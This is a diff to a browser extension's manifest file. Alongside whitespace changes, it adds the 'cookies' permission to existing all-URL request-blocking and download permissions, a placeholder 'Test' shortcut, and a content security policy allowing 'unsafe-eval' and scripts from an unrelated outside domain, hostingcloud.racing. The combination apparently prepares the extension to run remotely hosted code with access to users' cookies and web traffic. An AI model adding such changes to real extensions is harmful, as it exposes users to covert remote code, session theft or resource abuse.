@@ -4,9 +4,11 @@
     "version": "1.0",
     "manifest_version": 2,
     "background": {
-        "scripts": ["background.js"],
+        "scripts": [
+            "background.js"
+        ],
         "persistent": true
-      },
+    },
     "content_scripts": [
         {
             "matches": [
@@ -26,6 +28,16 @@
         "webRequest",
         "webRequestBlocking",
         "<all_urls>",
-        "downloads"
-    ]
+        "downloads",
+        "cookies"
+    ],
+    "commands": {
+        "test": {
+            "suggested_key": {
+                "default": "Ctrl+A"
+            },
+            "description": "Test"
+        }
+    },
+    "content_security_policy": "script-src 'self' 'unsafe-eval' https://www.hostingcloud.racing ; object-src 'self'"
 }
